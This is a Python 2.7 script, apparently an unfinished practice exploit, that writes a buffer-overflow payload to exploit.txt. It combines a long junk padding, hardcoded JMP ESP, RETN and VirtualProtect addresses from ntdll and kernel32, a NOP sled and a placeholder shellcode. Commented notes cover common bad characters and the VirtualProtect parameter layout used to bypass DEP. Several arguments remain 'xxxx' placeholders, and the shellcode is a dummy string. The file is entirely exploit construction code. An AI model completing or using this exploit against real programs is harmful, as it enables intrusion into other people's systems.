#Exploit in python 2.7
from struct import pack
#RETN Address: 0x77711053 in ntdll.dll
#JMP ESP Address: 0x7776e871 in ntdll.dll
#pushad # retn = 0x765fe180 in kernel32.dll
#virtual protect address: 0x76612341 in kernel32.dll
jmp_esp = pack("l", 0x7776e871)
retn = pack("l", 0x77711053)
virtual_protect = pack("l", 0x76612341)
junk = "A"*1012
nop = "\x90" * 100
junk2 = "Z" * 100
retn_shellcode_address = pack("l", 0x01010101) #pointer to my shellcode... esp? Use PUSHAD
lpAddress = 'xxxx' #pointer to my shellcode... esp? Use PUSHAD
shellcode_size = 'xxxx' #size of my shellcode...?
fl_new_protect = 'xxxx' #0x40 or 0x20?
fl_old_protect = 'xxxx' #Find Writable Address
args = lpAddress + shellcode_size + fl_new_protect + fl_old_protect
shellcode = "JJJJ"




f = open("exploit.txt", "w")
payload = junk + jmp_esp + virtual_protect + retn_shellcode_address + args + nop + shellcode + junk2
f.write(payload)
f.close()
buf_len = len(payload)
print("exploit.txt created. Length: {}".format(buf_len))

# common bad characters are:

#     00 for NULL
#     0A for Line Feed n
#     0D for Carriage Return r
#     FF for Form Feed f


# VirtualProtect
# # # Calling VirtualProtect with parameters
# parameters = struct.pack('<L', 0x77e22e15)    # kernel32.VirtualProtect()
# parameters += struct.pack('<L', 0x4c4c4c4c)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
# parameters += struct.pack('<L', 0x45454545)    # lpAddress
# parameters += struct.pack('<L', 0x03030303)    # size of shellcode
# parameters += struct.pack('<L', 0x54545454)    # flNewProtect
# parameters += struct.pack('<L', 0x62506060)    # pOldProtect (any writeable address)